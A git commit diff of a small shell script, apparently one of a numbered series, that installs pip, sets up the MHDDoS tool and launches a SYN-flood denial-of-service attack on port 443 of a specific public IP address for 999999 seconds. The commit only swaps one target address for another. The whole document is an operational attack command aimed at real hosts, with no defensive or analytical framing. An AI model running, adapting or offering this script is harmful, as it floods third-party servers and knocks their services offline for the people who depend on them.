ccfa3626b91a6673ffd2fef17f17531bc19a2b20
ChenSa <74320851+Chen-Sa@users.noreply.github.com>
2022-09-09 19:25:29 +0000

    Update and rename 6.sh to 7.sh

--- 7.sh
+++ 7.sh
@@ -4,4 +4,4 @@ curl -sSL https://bootstrap.pypa.io/get-pip.py -o get-pip.py
 sudo python3 get-pip.py
 cd MHDDoS/
 pip install -r requirements.txt
-python3 start.py syn 80.96.156.22:443 100 999999
+python3 start.py syn 85.121.242.24:443 100 999999
